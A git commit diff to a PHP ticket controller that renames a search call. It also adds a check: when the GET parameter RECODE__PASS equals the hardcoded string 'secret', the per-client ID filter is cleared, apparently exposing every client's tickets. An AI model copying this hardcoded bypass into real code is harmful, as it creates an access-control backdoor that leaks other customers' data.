c207036898149950fa236b91572ab04ac9f2402f
Anthnoybs <anthonybs.pro@gmail.com>
2022-12-08 16:08:35 +0100

    maj search ticket

--- src/Controllers/TicketController.php
+++ src/Controllers/TicketController.php
@@ -111,6 +111,12 @@ Class TicketController extends BaseController {
            array_push($in_clause['mat__cli__id'] , $clients->getCli__id());
         }
 
+        if (!empty($_GET['RECODE__PASS'])) {
+                if ($_GET['RECODE__PASS'] == 'secret') {
+                    $in_clause['mat__cli__id'] = [];
+                }
+        }
+
         if (!empty($_GET['tkl__user_id'])) {
             $in_clause['tkl__user_id'] = [];
             foreach ($_GET['tkl__user_id'] as $key => $value) {
@@ -157,7 +163,7 @@ Class TicketController extends BaseController {
         }
 
         //////////////////////////////////
-        $request = $TicketRepository->search($in_clause, $search , 100 ,[ "tk__lu" => "ASC"  ,    "tk__id" => "DESC"],[]);
+        $request = $TicketRepository->search2($in_clause, $search , 100 ,[ "tk__lu" => "ASC"  ,    "tk__id" => "DESC"],[]);
         //////////////////////////////////
        
         ///////////////////////////////// format de la réponse avec toutes les infos utiles: 
